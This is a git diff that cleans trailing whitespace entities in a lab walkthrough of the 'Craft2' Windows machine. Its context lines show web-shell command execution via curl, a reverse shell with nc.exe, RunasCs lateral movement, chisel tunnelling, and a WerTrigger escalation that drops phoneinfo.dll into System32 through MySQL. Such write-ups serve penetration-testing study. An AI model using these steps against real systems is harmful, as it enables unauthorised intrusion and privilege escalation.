@@ -17,7 +17,7 @@ PORT      STATE SERVICE
 49666/tcp open  unknown
 ```
 
-This is a continuation of the original Craft machine, and it appears that SMB is open for this machine. The last machine was pretty minimalist, so I think we might need this later.&#x20;
+This is a continuation of the original Craft machine, and it appears that SMB is open for this machine. The last machine was pretty minimalist, so I think we might need this later.
 
 ### ODT Macro Fail -> NTLM Steal
 
@@ -124,7 +124,7 @@ $ curl http://192.168.197.188/cmd.php?cmd=whoami
 craft2\apache
 ```
 
-We can then easily get a reverse shell by downloading `nc.exe` onto the machine and executing it.&#x20;
+We can then easily get a reverse shell by downloading `nc.exe` onto the machine and executing it.
 
 <figure><img src="../../../.gitbook/assets/image (2027).png" alt=""><figcaption></figcaption></figure>
 
@@ -134,7 +134,7 @@ This time, the `apache` user had no abusable privileges, and there was nothing m
 
 ### RunasCs.exe -> Lateral Movement Fail
 
-We still had `thecybergeek` password, and this is abusable using `RunasCs.exe`.&#x20;
+We still had `thecybergeek` password, and this is abusable using `RunasCs.exe`.
 
 {% embed url="https://github.com/antonioCoco/RunasCs" %}
 
@@ -182,7 +182,7 @@ Active Connections
   TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       652
 ```
 
-Interesting. We can forward this using `chisel.exe`.&#x20;
+Interesting. We can forward this using `chisel.exe`.
 
 ```bash
 ## on kali
@@ -252,7 +252,7 @@ This opens up quite a few exploits to getting an administrator shell, such as th
 
 {% embed url="https://github.com/sailay1996/WerTrigger" %}
 
-&#x20;To exploit this, we would need to have these files within a directory we control:
+To exploit this, we would need to have these files within a directory we control:
 
 ```
 C:\temp>dir
@@ -272,7 +272,7 @@ dir
                2 Dir(s)   7,268,442,112 bytes free
 ```
 
-Afterwards, using the MySQL instance, we can place the `phoneinfo.dll` file into `C:\Windows\System32`.&#x20;
+Afterwards, using the MySQL instance, we can place the `phoneinfo.dll` file into `C:\Windows\System32`.
 
 ```
 MariaDB [mysql]> select load_file('C:/temp/phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll"
